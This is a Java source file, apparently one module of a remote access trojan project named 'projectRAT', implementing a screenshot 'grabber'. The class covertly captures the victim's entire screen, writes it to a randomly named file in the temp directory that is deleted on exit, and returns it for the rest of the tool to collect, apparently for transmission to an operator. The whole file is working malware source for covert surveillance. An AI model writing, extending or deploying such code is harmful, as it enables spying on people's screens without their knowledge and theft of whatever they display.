package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;

public class ScreenShot implements Request {

    private File file;
    @Override
    public void init() throws Exception {

        Robot robot = new Robot();
        String savePath = System.getProperty("java.io.tmpdir") + new Random().nextInt(50000) + ".png";
        Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage image = robot.createScreenCapture(capture);
        file = new File(savePath);
        ImageIO.write(image,"png",file);
        file.deleteOnExit();
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[] {
          file
        };
    }
}
